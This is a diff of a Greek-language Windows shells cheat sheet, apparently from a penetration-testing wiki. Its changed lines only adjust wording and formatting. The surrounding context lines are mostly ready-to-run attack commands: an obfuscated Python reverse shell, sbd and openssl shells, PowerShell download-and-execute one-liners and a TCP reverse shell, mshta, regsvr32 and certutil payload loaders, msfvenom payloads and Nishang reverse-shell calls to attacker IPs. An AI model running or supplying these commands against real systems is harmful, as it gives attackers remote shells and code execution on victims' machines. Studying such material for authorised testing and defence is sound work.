@@ -4,8 +4,8 @@
 
 ## Lolbas
 
-Η σελίδα [lolbas-project.github.io](https://lolbas-project.github.io/) είναι για τα Windows όπως [https://gtfobins.github.io/](https://gtfobins.github.io/) είναι για το linux.\
-Προφανώς, **δεν υπάρχουν SUID αρχεία ή δικαιώματα sudo στα Windows**, αλλά είναι χρήσιμο να γνωρίζουμε **πώς** ορισμένα **binaries** μπορούν να (κατα)χρησιμοποιηθούν για να εκτελούν κάποιες απροσδόκητες ενέργειες όπως **η εκτέλεση αυθαίρετου κώδικα.**
+Η σελίδα [lolbas-project.github.io](https://lolbas-project.github.io/) είναι για Windows όπως [https://gtfobins.github.io/](https://gtfobins.github.io/) είναι για linux.\
+Προφανώς, **δεν υπάρχουν SUID αρχεία ή sudo δικαιώματα στα Windows**, αλλά είναι χρήσιμο να γνωρίζουμε **πώς** ορισμένα **binaries** μπορούν να (κατα)χρησιμοποιηθούν για να εκτελέσουν κάποιες απροσδόκητες ενέργειες όπως **η εκτέλεση αυθαίρετου κώδικα.**
 
 ## NC
 ```bash
@@ -27,7 +27,7 @@ ncat -l <PORT eg.443> --ssl
 ```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/) είναι μια φορητή και ασφαλής εναλλακτική του Netcat**. Λειτουργεί σε συστήματα τύπου Unix και Win32. Με χαρακτηριστικά όπως ισχυρή κρυπτογράφηση, εκτέλεση προγραμμάτων, προσαρμόσιμες θύρες προέλευσης και συνεχόμενη επανασύνδεση, το sbd παρέχει μια ευέλικτη λύση για επικοινωνία TCP/IP. Για τους χρήστες Windows, η έκδοση sbd.exe από τη διανομή Kali Linux μπορεί να χρησιμοποιηθεί ως αξιόπιστη αντικατάσταση του Netcat.
+**[sbd](https://www.kali.org/tools/sbd/) είναι μια φορητή και ασφαλής εναλλακτική του Netcat**. Λειτουργεί σε συστήματα τύπου Unix και Win32. Με χαρακτηριστικά όπως ισχυρή κρυπτογράφηση, εκτέλεση προγραμμάτων, προσαρμόσιμες πηγές θυρών και συνεχόμενη επανασύνδεση, το sbd παρέχει μια ευέλικτη λύση για επικοινωνία TCP/IP. Για τους χρήστες Windows, η έκδοση sbd.exe από τη διανομή Kali Linux μπορεί να χρησιμοποιηθεί ως αξιόπιστη αντικατάσταση του Netcat.
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -39,7 +39,7 @@ sbd 10.10.10.10 4444
 id
 uid=0(root) gid=0(root) groups=0(root)
 ```
-## Πυθών
+## Python
 ```bash
 #Windows
 C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
@@ -74,7 +74,7 @@ openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_clien
 #Windows
 openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
 ```
-## PowerShell
+## Powershell
 ```bash
 powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
 powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
@@ -93,7 +93,7 @@ Payload που γράφτηκε στον δίσκο: **WebDAV client local cache
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
-**Αποκτήστε περισσότερες πληροφορίες σχετικά με διάφορα Powershell Shells στο τέλος αυτού του εγγράφου**
+**Πάρτε περισσότερες πληροφορίες σχετικά με διαφορετικά Powershell Shells στο τέλος αυτού του εγγράφου**
 
 ## Mshta
 
@@ -115,7 +115,7 @@ mshta \\webdavserver\folder\payload.hta
 ```
 **Μπορείτε να κατεβάσετε και να εκτελέσετε πολύ εύκολα ένα Koadic zombie χρησιμοποιώντας το stager hta**
 
-#### παράδειγμα hta
+#### hta παράδειγμα
 
 [**Από εδώ**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
 ```xml
@@ -224,7 +224,7 @@ regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 #### Regsvr32 -sct
 
 [**Από εδώ**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
-```markup
+```html
 <?XML version="1.0"?>
 <!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
 <!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
@@ -263,7 +263,7 @@ certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
 ```
-**Ανιχνεύτηκε από τον αμυντικό**
+**Ανιχνεύθηκε από τον αμυντικό**
 
 ## **Cscript/Wscript**
 ```bash
@@ -280,7 +280,7 @@ msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > sh
 \\webdavserver\folder\batchfile.bat
 ```
 Διαδικασία που εκτελεί κλήση δικτύου: **svchost.exe**\
-Φορτίο που γράφτηκε στον δίσκο: **WebDAV client local cache**
+Payload που έχει γραφτεί στον δίσκο: **WebDAV client local cache**
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
 impacket-smbserver -smb2support kali `pwd`
@@ -375,11 +375,11 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-Στο φάκελο **Shells**, υπάρχουν πολλές διαφορετικές shells. Για να κατεβάσετε και να εκτελέσετε το Invoke-_PowerShellTcp.ps1_, κάντε ένα αντίγραφο του script και προσθέστε στο τέλος του αρχείου:
+Στον φάκελο **Shells**, υπάρχουν πολλές διαφορετικές shells. Για να κατεβάσετε και να εκτελέσετε Invoke-_PowerShellTcp.ps1_, κάντε ένα αντίγραφο του script και προσθέστε στο τέλος του αρχείου:
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
-Αρχίστε να εξυπηρετείτε το σενάριο σε έναν διακομιστή ιστού και εκτελέστε το στην πλευρά του θύματος:
+Αρχίστε να σερβίρετε το σενάριο σε έναν διακομιστή ιστού και εκτελέστε το στην πλευρά του θύματος:
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
@@ -447,7 +447,7 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ## Περισσότερα
 
 [PS>Attack](https://github.com/jaredhaight/PSAttack) PS κονσόλα με μερικά επιθετικά PS modules προφορτωμένα (κρυπτογραφημένα)\
-[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
+[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9)[\
 WinPWN](https://github.com/SecureThisShit/WinPwn) PS κονσόλα με μερικά επιθετικά PS modules και ανίχνευση proxy (IEX)
 
 ## Αναφορές
